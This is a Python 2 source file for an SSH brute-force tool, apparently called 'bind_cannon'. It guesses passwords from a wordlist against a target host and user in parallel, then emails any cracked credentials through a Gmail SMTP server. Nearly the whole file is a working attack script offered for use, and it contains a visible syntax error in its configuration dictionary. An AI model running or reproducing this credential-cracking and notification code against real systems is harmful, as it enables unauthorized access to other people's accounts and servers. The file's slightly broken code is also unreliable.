print \
''' 
     _     _           _                                      
    | |__ (_)_ __   __| |    ___ __ _ _ __  _ __   ___  _ __  
    | '_ \| | '_ \ / _` |   / __/ _` | '_ \| '_ \ /   \| '_ \ 
    | |_) | | | | | (_| |  | (_| (_| | | | | | | | X_X | | | |
    |_.__/|_|_| |_|\__,_|___\___\__,_|_| |_|_| |_|\___/|_| |_|
                       |_____|
             .-.
     *    _.-'  \\  
      \.-'       \\
    /           _/  
    |      _  /"                                        v0.1.0
    |     /_\\'                                     .: s0|st1c3
     \    \_/                                  Top-Hat-Sec.com
      """"                                         """"""""
    '''


from colorama import Fore

''' global ssh configs for controlling attack speed '''
MAX_WORKERS  = 4
DELAY        = 2
SUCCESS_MSG  = ''.join([Fore.GREEN, '[', '+', ']', Fore.WHITE,' Found creds: ',
                    Fore.BLUE, '%s', Fore.WHITE, '@', Fore.BLUE, '%s ',
                        Fore.WHITE,'identified by ',Fore.BLUE,'%s',Fore.RESET])


''' global SMTP configs for email notifications '''
SMTP_SERVER   = 'smtp.gmail.com'
SMTP_PORT     = 587
SMTP_DEBUG    = False
SMTP_SUBJECT  = 'BIND CANNON: Successful login!'
SMTP_GMAIL    = ''
SMTP_DEST     = [SMTP_GMAIL,]
SMTP_PASSWD   = ''

import sys
import time
import paramiko
from itertools import izip, repeat
from multiprocessing import Pool
from colorama import init as color_init
from GhostalService import SMTPBatchClient

def ssh_attempt(params):

    ''' set up the attempt '''
    target_ip, user, line = params
    attempt = line.rstrip()

    ''' establish ssh tunnel '''
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, username=user, password=attempt)

        ''' raise an exception on auth success '''
        raise Exception(SUCCESS_MSG %\
                 (user, target_ip, attempt))
    except paramiko.AuthenticationException:

        ''' catch and handle auth failure '''
        print '    %s[%sX%s]%s Failed attempt: %s%s%s %s' %\
            (Fore.GREEN, Fore.RED, Fore.GREEN,
                   Fore.WHITE, Fore.BLUE, attempt, Fore.WHITE, Fore.RESET)
        time.sleep(DELAY)

    finally:
        ''' clean up '''
        ssh.close()
    return attempt

def send_notification(content):
    

    ''' establish smtp connection '''
    with SMTPBatchClient(SMTP_SERVER,
            SMTP_PORT, SMTP_GMAIL, SMTP_PASSWD, debug=SMTP_DEBUG) as con:

                ''' send notifications '''
                print '    %s[%s!%s]%s Sending email to %s%s %s' %\
                    (Fore.GREEN, Fore.YELLOW, Fore.GREEN,
                        Fore.WHITE, Fore.BLUE, SMTP_GMAIL, Fore.RESET)
                con.setcontent(content, SMTP_SUBJECT) 
                con.sendall(SMTP_DEST)

def main():

    ''' setup '''
    wordlist = sys.argv[1]
    target_ip = sys.argv[2]
    user = sys.argv[3]
    configs = {
        'wordlist' : wordlist,
        'target_ip'] : target_ip,
        'user' : user,
    }


    ''' get crackin' '''
    pool = Pool(processes=MAX_WORKERS)

    with open(wordlist) as input_handle:

        try:
            results = pool.map(
                        ssh_attempt,
                        izip(repeat(target_ip),
                            repeat(user),
                            input_handle,
                        ),
                        1,
            )

        ''' terminate all other workers on exception '''
        except Exception, e:
            pool.close()
            pool.terminate()
            success_msg = str(e)
            print ' '*3, success_msg
            send_notification(
                success_msg.replace(
                    '[32m', '').replace(
                        '37m', '').replace(
                            '34m', '').replace(
                                '39m', ''))
        ''' otherwise wait for workers to join parent process '''
        else:
            pool.close()
            pool.join()
    
        ''' leave '''
        print '    %s[%s*%s]%s Exiting.%s' %\
            (Fore.GREEN, Fore.YELLOW, Fore.GREEN, Fore.WHITE, Fore.RESET)
    
if __name__ == '__main__':
    color_init()
    main()
